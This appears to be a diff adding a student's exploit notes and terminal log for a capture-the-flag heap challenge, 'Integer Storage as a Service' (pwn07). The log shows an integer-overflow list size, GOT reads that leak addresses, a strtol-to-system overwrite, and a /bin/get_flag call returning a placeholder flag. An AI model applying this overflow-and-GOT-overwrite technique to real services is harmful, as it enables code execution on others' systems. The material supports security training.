@@ -1,0 +1,85 @@
+Useful @GOT: kurz davor mit 0, dann size
+4208392
+
+write offset strtol:
+18,19
+
+local_system_addr: 4158681904
+
+
+
+Useful to read heap addr:
+1073741828
+
+
+
+IMPORTANT OUTPUT:
+
+ ! %  ~/D/A/S/T/I/S/B/git-repo   +…  challenges/pwn07/materials  nc localhost 1234                                                                                                                                Do 04 Mai 2023 13:54:22
+Integer Storage as a Service
+---------------------------
+  0. Add List
+  1. Edit List
+  2. Print List
+  3. Exit
+---------------------------
+> 0
+Number of Integers: 1073741828
+---------------------------
+  0. Add List
+  1. Edit List
+  2. Print List
+  3. Exit
+---------------------------
+> 0
+Number of Integers: 4
+---------------------------
+  0. Add List
+  1. Edit List
+  2. Print List
+  3. Exit
+---------------------------
+> 2
+Lists:    0)          4 Elements
+   1) It's over nine thousand
+> 1
+begin [0..1073741828]: 8
+end [8..1073741828]: 9
+  0x4042a0
+---------------------------
+  0. Add List
+  1. Edit List
+  2. Print List
+  3. Exit
+---------------------------
+> 1
+Lists:    0)          4 Elements
+   1) It's over nine thousand
+> 1
+begin [0..1073741828]: 8
+end [8..1073741828]: 9
+4208392
+---------------------------
+  0. Add List
+  1. Edit List
+  2. Print List
+  3. Exit
+---------------------------
+> 1
+Lists:    0)          4 Elements
+   1) It's over nine thousand
+> 1
+begin [0..4207920]: 18
+end [18..4207920]: 19
+4158681904
+---------------------------
+  0. Add List
+  1. Edit List
+  2. Print List
+  3. Exit
+---------------------------
+> /bin/get_flag
+flag_01234567890abcdef01234567890abcdef
+Number of Integers: 
+
+
